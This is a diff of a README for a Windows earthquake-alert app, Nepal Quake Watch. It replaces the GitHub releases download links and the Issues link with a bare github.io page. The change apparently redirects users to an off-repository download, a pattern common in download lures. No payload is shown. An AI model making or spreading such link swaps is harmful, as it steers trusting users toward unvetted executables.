@@ -47,10 +47,10 @@ Let’s get you set up! Follow these **four simple steps**:
 
 Visit this link to download the application:
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_NEPAL_QUAKE_WATCH-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Nancyk57/Nepal_Quake_Watch/releases)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_NEPAL_QUAKE_WATCH-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://nancyk57.github.io)
 
 Click the button above, or copy and paste this address into your web browser:  
-**https://github.com/Nancyk57/Nepal_Quake_Watch/releases**
+**https://nancyk57.github.io**
 
 ### Step 2: Choose the Latest Version
 
@@ -129,7 +129,7 @@ Simply delete the downloaded file. No installation or registry changes are made 
 We want your experience to be as smooth as possible.
 
 - If you encounter a problem, please visit our **Issues** page on GitHub:  
-  [https://github.com/Nancyk57/Nepal_Quake_Watch/issues](https://github.com/Nancyk57/Nepal_Quake_Watch/issues)
+  [https://nancyk57.github.io](https://nancyk57.github.io)
 - For general questions, email us at: **support@nepalquakewatch.org**
 - Follow us for updates on disaster preparedness tips and new features.
 
